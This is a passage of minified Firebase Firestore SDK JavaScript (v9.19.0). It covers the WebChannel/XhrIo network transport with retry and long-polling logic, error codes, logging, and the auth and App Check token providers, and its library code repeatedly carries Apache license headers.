Zt(e,t){we.call(this),this.D=e,this.u=t,this.m=void 0,this.readyState=en,this.status=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.v=new Headers,this.h=null,this.C="GET",this.B="",this.g=!1,this.A=this.j=this.l=null}Bt.prototype.cancel=function(){if(this.i=Wt(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&0!==this.g.size){for(let e of this.g.values())e.cancel();this.g.clear()}},Qt.prototype.stringify=function(e){return y.JSON.stringify(e,void 0)},Qt.prototype.parse=function(e){return y.JSON.parse(e,void 0)},S(Yt,Je),Yt.prototype.g=function(){return new Zt(this.l,this.j)},Yt.prototype.i=(r={},function(){return r}),S(Zt,we);var en=0;function tn(e){e.j.read().then(e.Ta.bind(e)).catch(e.ga.bind(e))}function nn(e){e.readyState=4,e.l=null,e.j=null,e.A=null,rn(e)}function rn(e){e.onreadystatechange&&e.onreadystatechange.call(e)}(u=Zt.prototype).open=function(e,t){if(this.readyState!=en)throw this.abort(),Error("Error reopening a connection");this.C=e,this.B=t,this.readyState=1,rn(this)},u.send=function(e){if(1!=this.readyState)throw this.abort(),Error("need to call open() first. ");this.g=!0;let t={headers:this.v,method:this.C,credentials:this.m,cache:void 0};e&&(t.body=e),(this.D||y).fetch(new Request(this.B,t)).then(this.Wa.bind(this),this.ga.bind(this))},u.abort=function(){this.response=this.responseText="",this.v=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch((()=>{})),1<=this.readyState&&this.g&&4!=this.readyState&&(this.g=!1,nn(this)),this.readyState=en},u.Wa=function(e){if(this.g&&(this.l=e,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=e.headers,this.readyState=2,rn(this)),this.g&&(this.readyState=3,rn(this),this.g)))if("arraybuffer"===this.responseType)e.arrayBuffer().then(this.Ua.bind(this),this.ga.bind(this));else if(void 0!==y.ReadableStream&&"body"in e){if(this.j=e.body.getReader(),this.u){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.A=new TextDecoder;tn(this)}else e.text().then(this.Va.bind(this),this.ga.bind(this))},u.Ta=function(e){if(this.g){if(this.u&&e.value)this.response.push(e.value);else if(!this.u){var t=e.value?e.value:new Uint8Array(0);(t=this.A.decode(t,{stream:!e.done}))&&(this.response=this.responseText+=t)}e.done?nn(this):rn(this),3==this.readyState&&tn(this)}},u.Va=function(e){this.g&&(this.response=this.responseText=e,nn(this))},u.Ua=function(e){this.g&&(this.response=e,nn(this))},u.ga=function(){this.g&&nn(this)},u.setRequestHeader=function(e,t){this.v.append(e,t)},u.getResponseHeader=function(e){return this.h&&this.h.get(e.toLowerCase())||""},u.getAllResponseHeaders=function(){if(!this.h)return"";let e=[],t=this.h.entries();for(var n=t.next();!n.done;)e.push((n=n.value)[0]+": "+n[1]),n=t.next();return e.join("\r\n")},Object.defineProperty(Zt.prototype,"withCredentials",{get:function(){return"include"===this.m},set:function(e){this.m=e?"include":"same-origin"}});var sn=y.JSON.parse;function an(e){we.call(this),this.headers=new Map,this.u=e||null,this.h=!1,this.C=this.g=null,this.H="",this.m=0,this.j="",this.l=this.F=this.v=this.D=!1,this.B=0,this.A=null,this.J=on,this.K=this.L=!1}S(an,we);var on="",ln=/^https?$/i,un=["POST","PUT"];function cn(e,t){e.h=!1,e.g&&(e.l=!0,e.g.abort(),e.l=!1),e.j=t,e.m=5,hn(e),fn(e)}function hn(e){e.D||(e.D=!0,be(e,"complete"),be(e,"error"))}function dn(e){if(e.h&&void 0!==g&&(!e.C[1]||4!=mn(e)||2!=e.aa()))if(e.v&&4==mn(e))De(e.Ha,0,e);else if(be(e,"readystatechange"),4==mn(e)){e.h=!1;try{let o=e.aa();e:switch(o){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var t,n,r=!0;break e;default:r=!1}if(!(t=r)){if(n=0===o){var i=String(e.H).match(wt)[1]||null;if(!i&&y.self&&y.self.location){var s=y.self.location.protocol;i=s.substr(0,s.length-1)}n=!ln.test(i?i.toLowerCase():"")}t=n}if(t)be(e,"complete"),be(e,"success");else{e.m=6;try{var a=2<mn(e)?e.g.statusText:""}catch(e){a=""}e.j=a+" ["+e.aa()+"]",hn(e)}}finally{fn(e)}}}function fn(e,t){if(e.g){pn(e);let n=e.g,r=e.C[0]?v:null;e.g=null,e.C=null,t||be(e,"ready");try{n.onreadystatechange=r}catch(e){}}}function pn(e){e.g&&e.K&&(e.g.ontimeout=null),e.A&&(y.clearTimeout(e.A),e.A=null)}function mn(e){return e.g?e.g.readyState:0}function gn(e){try{if(!e.g)return null;if("response"in e.g)return e.g.response;switch(e.J){case on:case"text":return e.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in e.g)return e.g.mozResponseArrayBuffer}return null}catch(e){return null}}function yn(e){let t="";return re(e,(function(e,n){t+=n+":"+e+"\r\n"})),t}function vn(e,t,n){e:{for(r in n){var r=!1;break e}r=!0}r||(n=yn(n),"string"==typeof e?null!=n&&encodeURIComponent(String(n)):St(e,t,n))}function wn(e,t,n){return n&&n.internalChannelParams&&n.internalChannelParams[e]||t}function bn(e){this.Ca=0,this.i=[],this.j=new Fe,this.ka=this.sa=this.F=this.V=this.g=this.za=this.D=this.ia=this.o=this.S=this.s=null,this.ab=this.U=0,this.Za=wn("failFast",!1,e),this.L=this.v=this.u=this.m=this.l=null,this.Y=!0,this.pa=this.Ba=this.T=-1,this.Z=this.A=this.C=0,this.Xa=wn("baseRetryDelayMs",5e3,e),this.bb=wn("retryDelaySeedMs",1e4,e),this.$a=wn("forwardChannelMaxRetries",2,e),this.ta=wn("forwardChannelRequestTimeoutMs",2e4,e),this.ra=e&&e.xmlHttpFactory||void 0,this.Da=e&&e.Zb||!1,this.J=void 0,this.H=e&&e.supportsCrossDomainXhr||!1,this.I="",this.h=new Bt(e&&e.concurrentRequestLimit),this.Fa=new Jt,this.O=e&&e.fastHandshake||!1,this.N=e&&e.encodeInitMessageHeaders||!1,this.O&&this.N&&(this.N=!1),this.Ya=e&&e.Xb||!1,e&&e.Aa&&this.j.Aa(),e&&e.forceLongPolling&&(this.Y=!1),this.$=!this.O&&this.Y&&e&&e.detectBufferingProxy||!1,this.ja=void 0,this.P=0,this.K=!1,this.la=this.B=null}function _n(e){if(En(e),3==e.G){var t=e.U++,n=_t(e.F);St(n,"SID",e.I),St(n,"RID",t),St(n,"TYPE","terminate"),kn(e,n),(t=new rt(e,e.j,t,void 0)).K=2,t.v=kt(_t(n)),n=!1,y.navigator&&y.navigator.sendBeacon&&(n=y.navigator.sendBeacon(t.v.toString(),"")),!n&&y.Image&&((new Image).src=t.v,n=!0),n||(t.g=Un(t.l,null),t.g.da(t.v)),t.F=Date.now(),dt(t)}Mn(e)}function In(e){e.g&&(On(e),e.g.cancel(),e.g=null)}function En(e){In(e),e.u&&(y.clearTimeout(e.u),e.u=null),Rn(e),e.h.cancel(),e.m&&("number"==typeof e.m&&y.clearTimeout(e.m),e.m=null)}function Tn(e){$t(e.h)||e.m||(e.m=!0,Se(e.Ja,e),e.C=0)}function Sn(e,t){var n;n=t?t.m:e.U++;let r=_t(e.F);St(r,"SID",e.I),St(r,"RID",n),St(r,"AID",e.T),kn(e,r),e.o&&e.s&&vn(r,e.o,e.s),n=new rt(e,e.j,n,e.C+1),null===e.o&&(n.H=e.s),t&&(e.i=t.D.concat(e.i)),t=An(e,n,1e3),n.setTimeout(Math.round(.5*e.ta)+Math.round(.5*e.ta*Math.random())),Kt(e.h,n),lt(n,r,t)}function kn(e,t){e.ia&&re(e.ia,(function(e,n){St(t,n,e)})),e.l&&vt({},(function(e,n){St(t,n,e)}))}function An(e,t,n){n=Math.min(e.i.length,n);var r=e.l?E(e.l.Ra,e.l,e):null;e:{var i=e.i;let t=-1;for(;;){let s=["count="+n];-1==t?0<n?(t=i[0].h,s.push("ofs="+t)):t=0:s.push("ofs="+t);let a=!0;for(let o=0;o<n;o++){let n=i[o].h,l=i[o].g;if(0>(n-=t))t=Math.max(0,i[o].h-100),a=!1;else try{!function(e,t,n){let r=n||"";try{vt(e,(function(e,n){let i=e;b(e)&&(i=Ie(e)),t.push(r+n+"="+encodeURIComponent(i))}))}catch(e){throw t.push(r+"type="+encodeURIComponent("_badmap")),e}}(l,s,"req"+n+"_")}catch(e){r&&r(l)}}if(a){r=s.join("&");break e}}}return e=e.i.splice(0,n),t.D=e,r}function Cn(e){e.g||e.u||(e.Z=1,Se(e.Ia,e),e.A=0)}function Nn(e){return!(e.g||e.u||3<=e.A||(e.Z++,e.u=He(E(e.Ia,e),Pn(e,e.A)),e.A++,0))}function On(e){null!=e.B&&(y.clearTimeout(e.B),e.B=null)}function Dn(e){e.g=new rt(e,e.j,"rpc",e.Z),null===e.o&&(e.g.H=e.s),e.g.N=0;var t=_t(e.sa);St(t,"RID","rpc"),St(t,"SID",e.I),St(t,"CI",e.L?"0":"1"),St(t,"AID",e.T),St(t,"TYPE","xmlhttp"),kn(e,t),e.o&&e.s&&vn(t,e.o,e.s),e.J&&e.g.setTimeout(e.J);var n=e.g;e=e.ka,n.K=1,n.v=kt(_t(t)),n.s=null,n.P=!0,ut(n,e)}function Rn(e){null!=e.v&&(y.clearTimeout(e.v),e.v=null)}function xn(e,t){var n=null;if(e.g==t){Rn(e),On(e),e.g=null;var r=2}else{if(!Gt(e.h,t))return;n=t.D,Ht(e.h,t),r=1}if(0!=e.G)if(e.pa=t.Y,t.i)if(1==r){n=t.s?t.s.length:0,t=Date.now()-t.F;var i,s,a=e.C;be(r=Be(),new Ke(r,n)),Tn(e)}else Cn(e);else if(3==(a=t.o)||0==a&&0<e.pa||(1!=r||(s=t,zt((i=e).h)>=i.h.j-(i.m?1:0)||(i.m?(i.i=s.D.concat(i.i),0):1==i.G||2==i.G||i.C>=(i.Za?0:i.$a)||(i.m=He(E(i.Ja,i,s),Pn(i,i.C)),i.C++,0))))&&(2!=r||!Nn(e)))switch(n&&0<n.length&&((t=e.h).i=t.i.concat(n)),a){case 1:Ln(e,5);break;case 4:Ln(e,10);break;case 3:Ln(e,6);break;default:Ln(e,2)}}function Pn(e,t){let n=e.Xa+Math.floor(Math.random()*e.bb);return e.l||(n*=2),n*t}function Ln(e,t){if(e.j.info("Error code "+t),2==t){var n=null;e.l&&(n=null);var r=E(e.kb,e);n||(n=new bt("//www.google.com/images/cleardot.gif"),y.location&&"http"==y.location.protocol||It(n,"https"),kt(n)),function(e,t){let n=new Fe;if(y.Image){let r=new Image;r.onload=T(Xt,n,r,"TestLoadImage: loaded",!0,t),r.onerror=T(Xt,n,r,"TestLoadImage: error",!1,t),r.onabort=T(Xt,n,r,"TestLoadImage: abort",!1,t),r.ontimeout=T(Xt,n,r,"TestLoadImage: timeout",!1,t),y.setTimeout((function(){r.ontimeout&&r.ontimeout()}),1e4),r.src=e}else t(!1)}(n.toString(),r)}else Ge(2);e.G=0,e.l&&e.l.va(t),Mn(e),En(e)}function Mn(e){if(e.G=0,e.la=[],e.l){let t=Wt(e.h);(0!=t.length||0!=e.i.length)&&(N(e.la,t),N(e.la,e.i),e.h.i.length=0,C(e.i),e.i.length=0),e.l.ua()}}function Fn(e,t,n){var r=n instanceof bt?_t(n):new bt(n,void 0);if(""!=r.g)t&&(r.g=t+"."+r.g),Et(r,r.m);else{var i=y.location;r=i.protocol,t=t?t+"."+i.hostname:i.hostname,i=+i.port;var s=new bt(null,void 0);r&&It(s,r),t&&(s.g=t),i&&Et(s,i),n&&(s.l=n),r=s}return n=e.D,t=e.za,n&&t&&St(r,n,t),St(r,"VER",e.ma),kn(e,r),r}function Un(e,t,n){if(t&&!e.H)throw Error("Can't create secondary domain capable XhrIo object.");return(t=new an(n&&e.Da&&!e.ra?new Yt({jb:!0}):e.ra)).Ka(e.H),t}function Vn(){}function jn(){if(V&&!(10<=Number(J)))throw Error("Environmental error: no available transport.")}function Bn(e,t){we.call(this),this.g=new bn(t),this.l=e,this.h=t&&t.messageUrlParams||null,e=t&&t.messageHeaders||null,t&&t.clientProtocolHeaderRequired&&(e?e["X-Client-Protocol"]="webchannel":e={"X-Client-Protocol":"webchannel"}),this.g.s=e,e=t&&t.initMessageHeaders||null,t&&t.messageContentType&&(e?e["X-WebChannel-Content-Type"]=t.messageContentType:e={"X-WebChannel-Content-Type":t.messageContentType}),t&&t.ya&&(e?e["X-WebChannel-Client-Profile"]=t.ya:e={"X-WebChannel-Client-Profile":t.ya}),this.g.S=e,(e=t&&t.Yb)&&!R(e)&&(this.g.o=e),this.A=t&&t.supportsCrossDomainXhr||!1,this.v=t&&t.sendRawJson||!1,(t=t&&t.httpSessionIdParam)&&!R(t)&&(this.g.D=t,null!==(e=this.h)&&t in e&&t in(e=this.h)&&delete e[t]),this.j=new zn(this)}function qn(e){et.call(this);var t=e.__sm__;if(t){e:{for(let n in t){e=n;break e}e=void 0}(this.i=e)&&(e=this.i,t=null!==t&&e in t?t[e]:void 0),this.data=t}else this.data=e}function $n(){tt.call(this),this.status=1}function zn(e){this.g=e}(u=an.prototype).Ka=function(e){this.L=e},u.da=function(e,t,n,r){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.H+"; newUri="+e);t=t?t.toUpperCase():"GET",this.H=e,this.j="",this.m=0,this.D=!1,this.h=!0,this.g=this.u?this.u.g():a.g(),this.C=this.u?Xe(this.u):Xe(a),this.g.onreadystatechange=E(this.Ha,this);try{this.F=!0,this.g.open(t,String(e),!0),this.F=!1}catch(e){return void cn(this,e)}if(e=n||"",n=new Map(this.headers),r)if(Object.getPrototypeOf(r)===Object.prototype)for(var s in r)n.set(s,r[s]);else{if("function"!=typeof r.keys||"function"!=typeof r.get)throw Error("Unknown input type for opt_headers: "+String(r));for(let e of r.keys())n.set(e,r.get(e))}for(let[i,a]of(r=Array.from(n.keys()).find((e=>"content-type"==e.toLowerCase())),s=y.FormData&&e instanceof y.FormData,!(0<=A(un,t))||r||s||n.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8"),n))this.g.setRequestHeader(i,a);this.J&&(this.g.responseType=this.J),"withCredentials"in this.g&&this.g.withCredentials!==this.L&&(this.g.withCredentials=this.L);try{var o,l;pn(this),0<this.B&&((this.K=(o=this.g,V&&(l=Q,Object.prototype.hasOwnProperty.call(l,9)?l[9]:l[9]=function(){let e=0,t=x(String(i)).split("."),n=x("9").split("."),r=Math.max(t.length,n.length);for(let i=0;0==e&&i<r;i++){var s=t[i]||"",a=n[i]||"";do{if(s=/(\d*)(\D*)(.*)/.exec(s)||["","","",""],a=/(\d*)(\D*)(.*)/.exec(a)||["","","",""],0==s[0].length&&0==a[0].length)break;e=P(0==s[1].length?0:parseInt(s[1],10),0==a[1].length?0:parseInt(a[1],10))||P(0==s[2].length,0==a[2].length)||P(s[2],a[2]),s=s[3],a=a[3]}while(0==e)}return 0<=e}())&&"number"==typeof o.timeout&&void 0!==o.ontimeout))?(this.g.timeout=this.B,this.g.ontimeout=E(this.qa,this)):this.A=De(this.qa,this.B,this)),this.v=!0,this.g.send(e),this.v=!1}catch(e){cn(this,e)}},u.qa=function(){void 0!==g&&this.g&&(this.j="Timed out after "+this.B+"ms, aborting",this.m=8,be(this,"timeout"),this.abort(8))},u.abort=function(e){this.g&&this.h&&(this.h=!1,this.l=!0,this.g.abort(),this.l=!1,this.m=e||7,be(this,"complete"),be(this,"abort"),fn(this))},u.M=function(){this.g&&(this.h&&(this.h=!1,this.l=!0,this.g.abort(),this.l=!1),fn(this,!0)),an.X.M.call(this)},u.Ha=function(){this.s||(this.F||this.v||this.l?dn(this):this.fb())},u.fb=function(){dn(this)},u.aa=function(){try{return 2<mn(this)?this.g.status:-1}catch(e){return-1}},u.fa=function(){try{return this.g?this.g.responseText:""}catch(e){return""}},u.Sa=function(e){if(this.g){var t=this.g.responseText;return e&&0==t.indexOf(e)&&(t=t.substring(e.length)),sn(t)}},u.Ea=function(){return this.m},u.Oa=function(){return"string"==typeof this.j?this.j:String(this.j)},(u=bn.prototype).ma=8,u.G=1,u.Ja=function(e){if(this.m)if(this.m=null,1==this.G){if(!e){this.U=Math.floor(1e5*Math.random()),e=this.U++;let i=new rt(this,this.j,e,void 0),s=this.s;if(this.S&&(s?ae(s=ie(s),this.S):s=this.S),null!==this.o||this.N||(i.H=s,s=null),this.O)e:{for(var t=0,n=0;n<this.i.length;n++){var r=this.i[n];if(void 0===(r="__data__"in r.g&&"string"==typeof(r=r.g.__data__)?r.length:void 0))break;if(4096<(t+=r)){t=n;break e}if(4096===t||n===this.i.length-1){t=n+1;break e}}t=1e3}else t=1e3;t=An(this,i,t),St(n=_t(this.F),"RID",e),St(n,"CVER",22),this.D&&St(n,"X-HTTP-Session-Id",this.D),kn(this,n),s&&(this.N?t="headers="+encodeURIComponent(String(yn(s)))+"&"+t:this.o&&vn(n,this.o,s)),Kt(this.h,i),this.Ya&&St(n,"TYPE","init"),this.O?(St(n,"$req",t),St(n,"SID","null"),i.Z=!0,lt(i,n,null)):lt(i,n,t),this.G=2}}else 3==this.G&&(e?Sn(this,e):0==this.i.length||$t(this.h)||Sn(this))},u.Ia=function(){if(this.u=null,Dn(this),this.$&&!(this.K||null==this.g||0>=this.P)){var e=2*this.P;this.j.info("BP detection timer enabled: "+e),this.B=He(E(this.eb,this),e)}},u.eb=function(){this.B&&(this.B=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.L=!1,this.K=!0,Ge(10),In(this),Dn(this))},u.cb=function(){null!=this.v&&(this.v=null,In(this),Nn(this),Ge(19))},u.kb=function(e){e?(this.j.info("Successfully pinged google.com"),Ge(2)):(this.j.info("Failed to ping google.com"),Ge(1))},(u=Vn.prototype).xa=function(){},u.wa=function(){},u.va=function(){},u.ua=function(){},u.Ra=function(){},jn.prototype.g=function(e,t){return new Bn(e,t)},S(Bn,we),Bn.prototype.m=function(){this.g.l=this.j,this.A&&(this.g.H=!0);var e=this.g,t=this.l,n=this.h||void 0;Ge(0),e.V=t,e.ia=n||{},e.L=e.Y,e.F=Fn(e,null,e.V),Tn(e)},Bn.prototype.close=function(){_n(this.g)},Bn.prototype.u=function(e){var t=this.g;if("string"==typeof e){var n={};n.__data__=e,e=n}else this.v&&((n={}).__data__=Ie(e),e=n);t.i.push(new class{constructor(e,t){this.h=e,this.g=t}}(t.ab++,e)),3==t.G&&Tn(t)},Bn.prototype.M=function(){this.g.l=null,delete this.j,_n(this.g),delete this.g,Bn.X.M.call(this)},S(qn,et),S($n,tt),S(zn,Vn),zn.prototype.xa=function(){be(this.g,"a")},zn.prototype.wa=function(e){be(this.g,new qn(e))},zn.prototype.va=function(e){be(this.g,new $n)},zn.prototype.ua=function(){be(this.g,"b")},jn.prototype.createWebChannel=jn.prototype.g,Bn.prototype.send=Bn.prototype.u,Bn.prototype.open=Bn.prototype.m,Bn.prototype.close=Bn.prototype.close,We.NO_ERROR=0,We.TIMEOUT=8,We.HTTP_ERROR=6,Qe.COMPLETE="complete",Ye.EventType=Ze,Ze.OPEN="a",Ze.CLOSE="b",Ze.ERROR="c",Ze.MESSAGE="d",we.prototype.listen=we.prototype.N,an.prototype.listenOnce=an.prototype.O,an.prototype.getLastError=an.prototype.Oa,an.prototype.getLastErrorCode=an.prototype.Ea,an.prototype.getStatus=an.prototype.aa,an.prototype.getResponseJson=an.prototype.Sa,an.prototype.getResponseText=an.prototype.fa,an.prototype.send=an.prototype.da,an.prototype.setWithCredentials=an.prototype.Ka;var Gn=m.createWebChannelTransport=function(){return new jn},Kn=m.getStatEventTarget=function(){return Be()},Hn=m.ErrorCode=We,Wn=m.EventType=Qe,Qn=m.Event=Ve,Jn=m.Stat={sb:0,vb:1,wb:2,Pb:3,Ub:4,Rb:5,Sb:6,Qb:7,Ob:8,Tb:9,PROXY:10,NOPROXY:11,Mb:12,Ib:13,Jb:14,Hb:15,Kb:16,Lb:17,ob:18,nb:19,pb:20},Xn=m.FetchXmlHttpFactory=Yt,Yn=m.WebChannel=Ye,Zn=m.XhrIo=an;n(3454);let er="@firebase/firestore";
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class tr{constructor(e){this.uid=e}isAuthenticated(){return null!=this.uid}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}}tr.UNAUTHENTICATED=new tr(null),tr.GOOGLE_CREDENTIALS=new tr("google-credentials-uid"),tr.FIRST_PARTY=new tr("first-party-uid"),tr.MOCK_USER=new tr("mock-user");
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
let nr="9.19.0",rr=new d.Yd("@firebase/firestore");function ir(){return rr.logLevel}function sr(e,...t){if(rr.logLevel<=d.in.DEBUG){let n=t.map(lr);rr.debug(`Firestore (${nr}): ${e}`,...n)}}function ar(e,...t){if(rr.logLevel<=d.in.ERROR){let n=t.map(lr);rr.error(`Firestore (${nr}): ${e}`,...n)}}function or(e,...t){if(rr.logLevel<=d.in.WARN){let n=t.map(lr);rr.warn(`Firestore (${nr}): ${e}`,...n)}}function lr(e){if("string"==typeof e)return e;try{return JSON.stringify(e)}catch(t){return e}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ur(e="Unexpected state"){let t=`FIRESTORE (${nr}) INTERNAL ASSERTION FAILED: `+e;throw ar(t),Error(t)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let cr={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class hr extends f.ZR{constructor(e,t){super(e,t),this.code=e,this.message=t,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class dr{constructor(){this.promise=new Promise(((e,t)=>{this.resolve=e,this.reject=t}))}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class fr{constructor(e,t){this.user=t,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}}class pr{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,t){e.enqueueRetryable((()=>t(tr.UNAUTHENTICATED)))}shutdown(){}}class mr{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,t){this.changeListener=t,e.enqueueRetryable((()=>t(this.token.user)))}shutdown(){this.changeListener=null}}class gr{constructor(e){this.t=e,this.currentUser=tr.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,t){let n=this.i,r=e=>this.i!==n?(n=this.i,t(e)):Promise.resolve(),i=new dr;this.o=()=>{this.i++,this.currentUser=this.u(),i.resolve(),i=new dr,e.enqueueRetryable((()=>r(this.currentUser)))};let s=()=>{let t=i;e.enqueueRetryable((async()=>{await t.promise,await r(this.currentUser)}))},a=e=>{sr("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=e,this.auth.addAuthTokenListener(this.o),s()};this.t.onInit((e=>a(e))),setTimeout((()=>{if(!this.auth){let e=this.t.getImmediate({optional:!0});e?a(e):(sr("FirebaseAuthCredentialsProvider","Auth not yet detected"),i.resolve(),i=new dr)}}),0),s()}getToken(){let e=this.i,t=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(t).then((t=>this.i!==e?(sr("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):t?("string"==typeof t.accessToken||ur(),new fr(t.accessToken,this.currentUser)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.auth.removeAuthTokenListener(this.o)}u(){let e=this.auth&&this.auth.getUid();return null===e||"string"==typeof e||ur(),new tr(e)}}class yr{constructor(e,t,n){this.h=e,this.l=t,this.m=n,this.type="FirstParty",this.user=tr.FIRST_PARTY,this.g=new Map}p(){return this.m?this.m():null}get headers(){this.g.set("X-Goog-AuthUser",this.h);let e=this.p();return e&&this.g.set("Authorization",e),this.l&&this.g.set("X-Goog-Iam-Authorization-Token",this.l),this.g}}class vr{constructor(e,t,n){this.h=e,this.l=t,this.m=n}getToken(){return Promise.resolve(new yr(this.h,this.l,this.m))}start(e,t){e.enqueueRetryable((()=>t(tr.FIRST_PARTY)))}shutdown(){}invalidateToken(){}}class wr{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}}class br{constructor(e){this.I=e,this.forceRefresh=!1,this.appCheck=null,this.T=null}start(e,t){let n=e=>{null!=e.error&&sr("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${e.error.message}`);let n=e.token!==this.T;return this.T=e.token,sr("FirebaseAppCheckTokenProvider",`Received ${n?"new":"existing"} token.`),n?t(e.token):Promise.resolve()};this.o=t=>{e.enqueueRetryable((()=>n(t)))};let r=e=>{sr("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=e,this.appCheck.addTokenListener(this.o)};this.I.onInit((e=>r(e))),setTimeout((()=>{if(!this.appCheck){let e=this.I.getImmediate({optional:!0});e?r(e):sr("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}}),0)}getToken(){let e=this.forceRefresh;return this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then((e=>e?("string"==typeof e.token||ur(),this.T=e.token,new wr(e.token)):null)):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.appCheck.removeTokenListener(this.o)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _r{static A(){let e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=Math.floor(256/e.length)*e.length,n="";for(;n.length<20;){let r=
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
